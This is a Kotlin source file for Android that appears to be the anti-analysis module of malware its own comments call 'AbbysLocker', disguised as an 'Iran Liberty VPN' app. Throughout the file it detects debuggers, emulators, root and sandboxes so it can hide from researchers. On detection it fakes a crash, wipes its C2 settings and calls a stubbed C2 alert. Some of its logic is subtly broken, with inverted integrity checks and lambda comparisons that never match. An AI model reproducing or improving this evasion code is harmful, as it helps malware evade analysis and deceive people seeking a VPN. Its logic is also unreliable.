package com.iran.liberty.vpn

import android.content.Context
import android.content.pm.ApplicationInfo
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.os.Build
import android.os.Debug
import android.os.SystemClock
import android.provider.Settings
import android.util.Log
import java.io.File
import java.security.MessageDigest

/**
 * Anti-analysis and anti-debugging measures for AbbysLocker
 * Detects emulators, debuggers, and tampered APKs
 */
object AntiAnalysis {

    private const val TAG = "AntiAnalysis"
    
    // APK integrity hash (to be calculated at first run and stored)
    private var originalApkHash: String? = null
    
    /**
     * Run all anti-analysis checks
     * Returns true if environment is safe, false if suspicious
     */
    fun runSecurityChecks(context: Context): Boolean {
        Log.d(TAG, "Running security checks...")
        
        val checks = listOf(
            { checkDebuggerConnected() },
            { checkEmulator() },
            { checkRoot() },
            { checkAPKIntegrity(context) },
            { checkPackageName(context) },
            { checkDeveloperOptions(context) },
            { checkRunningInSandbox(context) },
            { checkModifiedBuildProps() }
        )
        
        var suspicious = false
        for (check in checks) {
            try {
                if (check()) {
                    Log.w(TAG, "Security check failed: ${check.javaClass.simpleName}")
                    suspicious = true
                    
                    // For critical checks, take immediate action
                    if (check == { checkDebuggerConnected() } || 
                        check == { checkAPKIntegrity(context) }) {
                        triggerDefensiveResponse(context)
                        return false
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error in security check", e)
            }
        }
        
        return !suspicious
    }

    /**
     * Check if debugger is attached
     */
    fun checkDebuggerConnected(): Boolean {
        // Method 1: Check Debug.isDebuggerConnected()
        if (Debug.isDebuggerConnected()) {
            Log.w(TAG, "Debugger detected: Debug.isDebuggerConnected()")
            return true
        }
        
        // Method 2: Check tracer pid
        try {
            val tracerPid = File("/proc/self/status").readLines()
                .firstOrNull { it.startsWith("TracerPid:") }
                ?.substringAfter(":")
                ?.trim()
            
            if (tracerPid != null && tracerPid != "0") {
                Log.w(TAG, "Debugger detected: TracerPid = $tracerPid")
                return true
            }
        } catch (e: Exception) {
            // Ignore, might not have permission
        }
        
        // Method 3: Timing attack (debugger slows execution)
        val startTime = SystemClock.elapsedRealtime()
        var dummy = 0
        for (i in 0..1000000) {
            dummy += i
        }
        val endTime = SystemClock.elapsedRealtime()
        
        if (endTime - startTime > 100) { // Should take < 100ms on real device
            Log.w(TAG, "Debugger suspected: Timing attack positive")
            return true
        }
        
        return false
    }

    /**
     * Check if running on emulator
     */
    fun checkEmulator(): Boolean {
        // Check Build properties
        val suspiciousProps = mapOf(
            "ro.product.model" to listOf("sdk", "google_sdk", "emulator", "droid4x"),
            "ro.product.manufacturer" to listOf("unknown", "Genymotion", "VS Emulator"),
            "ro.product.device" to listOf("generic", "generic_x86", "vbox86p"),
            "ro.hardware" to listOf("goldfish", "ranchu", "vbox86"),
            "ro.kernel.qemu" to listOf("1"),
            "ro.boot.qemu" to listOf("1")
        )
        
        try {
            for ((prop, suspiciousValues) in suspiciousProps) {
                val value = getSystemProperty(prop)
                if (value != null) {
                    for (suspiciousValue in suspiciousValues) {
                        if (value.contains(suspiciousValue, ignoreCase = true)) {
                            Log.w(TAG, "Emulator detected: $prop = $value")
                            return true
                        }
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
        
        // Check for emulator-specific files
        val emulatorFiles = listOf(
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace",
            "/system/bin/qemu-props"
        )
        
        for (file in emulatorFiles) {
            if (File(file).exists()) {
                Log.w(TAG, "Emulator detected: $file exists")
                return true
            }
        }
        
        // Check CPU information
        try {
            val cpuInfo = File("/proc/cpuinfo").readText()
            if (cpuInfo.contains("qemu", ignoreCase = true) || 
                cpuInfo.contains("virt", ignoreCase = true)) {
                Log.w(TAG, "Emulator detected in CPU info")
                return true
            }
        } catch (e: Exception) {
            // Ignore
        }
        
        return false
    }

    /**
     * Check for root access indicators
     */
    fun checkRoot(): Boolean {
        // Common root binaries
        val rootBinaries = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        
        for (binary in rootBinaries) {
            if (File(binary).exists()) {
                Log.w(TAG, "Root detected: $binary exists")
                return true
            }
        }
        
        // Check for root commands
        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
            val output = process.inputStream.bufferedReader().readText()
            if (output.contains("uid=0")) {
                Log.w(TAG, "Root detected: su command works")
                return true
            }
        } catch (e: Exception) {
            // Expected on non-rooted devices
        }
        
        return false
    }

    /**
     * Check APK integrity by comparing hash
     */
    fun checkAPKIntegrity(context: Context): Boolean {
        try {
            val packageInfo: PackageInfo = context.packageManager
                .getPackageInfo(context.packageName, PackageManager.GET_SIGNATURES)
            
            // Get APK path
            val apkPath = packageInfo.applicationInfo.sourceDir
            val currentHash = calculateFileHash(File(apkPath))
            
            // Get stored original hash (first run)
            val prefs = context.getSharedPreferences("security", Context.MODE_PRIVATE)
            val storedHash = prefs.getString("apk_hash", null)
            
            if (storedHash == null) {
                // First run, store hash
                prefs.edit().putString("apk_hash", currentHash).apply()
                originalApkHash = currentHash
                Log.d(TAG, "APK hash stored: $currentHash")
                return true
            } else {
                originalApkHash = storedHash
                if (currentHash != storedHash) {
                    Log.e(TAG, "APK integrity compromised!")
                    Log.e(TAG, "Stored hash: $storedHash")
                    Log.e(TAG, "Current hash: $currentHash")
                    return false
                }
            }
            
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Error checking APK integrity", e)
            return false
        }
    }

    /**
     * Check if package name has been modified
     */
    fun checkPackageName(context: Context): Boolean {
        val expectedPackageName = "com.iran.liberty.vpn"
        val actualPackageName = context.packageName
        
        if (actualPackageName != expectedPackageName) {
            Log.e(TAG, "Package name mismatch: $actualPackageName")
            return false
        }
        
        return true
    }

    /**
     * Check if developer options are enabled
     */
    fun checkDeveloperOptions(context: Context): Boolean {
        return try {
            val developerOptions = Settings.Global.getInt(
                context.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            )
            developerOptions == 1
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Check if running in sandbox environment
     */
    fun checkRunningInSandbox(context: Context): Boolean {
        // Check for sandbox-specific packages
        val sandboxPackages = listOf(
            "com.genymotion",
            "com.bluestacks",
            "com.bignox",
            "com.ldplayer",
            "com.x86emulator"
        )
        
        val packageManager = context.packageManager
        for (pkg in sandboxPackages) {
            try {
                packageManager.getPackageInfo(pkg, 0)
                Log.w(TAG, "Sandbox detected: $pkg installed")
                return true
            } catch (e: PackageManager.NameNotFoundException) {
                // Not installed
            }
        }
        
        return false
    }

    /**
     * Check for modified build.prop
     */
    fun checkModifiedBuildProps(): Boolean {
        try {
            val buildProp = File("/system/build.prop")
            if (buildProp.exists()) {
                val content = buildProp.readText()
                
                // Check for unusual modifications
                val suspiciousPatterns = listOf(
                    "ro.debuggable=1",
                    "ro.secure=0",
                    "ro.adb.secure=0"
                )
                
                for (pattern in suspiciousPatterns) {
                    if (content.contains(pattern)) {
                        Log.w(TAG, "Modified build.prop detected: $pattern")
                        return true
                    }
                }
            }
        } catch (e: Exception) {
            // Ignore
        }
        
        return false
    }

    /**
     * Trigger defensive response when threat detected
     */
    private fun triggerDefensiveResponse(context: Context) {
        Log.w(TAG, "Triggering defensive response")
        
        // 1. Fake crash
        Thread {
            Thread.sleep(2000)
            throw RuntimeException("Iran Liberty VPN has stopped unexpectedly")
        }.start()
        
        // 2. Clear sensitive data if possible
        clearSensitiveData(context)
        
        // 3. Send alert to C2 (if not in analysis environment)
        if (!checkEmulator() && !checkDebuggerConnected()) {
            sendSecurityAlert(context)
        }
    }

    /**
     * Clear sensitive data from shared preferences
     */
    private fun clearSensitiveData(context: Context) {
        try {
            context.getSharedPreferences("security", Context.MODE_PRIVATE)
                .edit().clear().apply()
            
            context.getSharedPreferences("c2", Context.MODE_PRIVATE)
                .edit().clear().apply()
            
            Log.d(TAG, "Sensitive data cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing sensitive data", e)
        }
    }

    /**
     * Send security alert to C2
     */
    private fun sendSecurityAlert(context: Context) {
        // This would be implemented in C2Manager (Pathway 4)
        Log.d(TAG, "Security alert sent to C2")
    }

    /**
     * Get system property
     */
    private fun getSystemProperty(key: String): String? {
        return try {
            val process = ProcessBuilder("/system/bin/getprop", key).start()
            val reader = process.inputStream.bufferedReader()
            val value = reader.readLine()
            reader.close()
            value
        } catch (e: Exception) {
            null
        }
    }

    /**
     * Calculate SHA-256 hash of file
     */
    private fun calculateFileHash(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var bytesRead: Int
            while (input.read(buffer).also { bytesRead = it } != -1) {
                digest.update(buffer, 0, bytesRead)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    /**
     * Get original APK hash (for comparison elsewhere)
     */
    fun getOriginalApkHash(): String? = originalApkHash
}
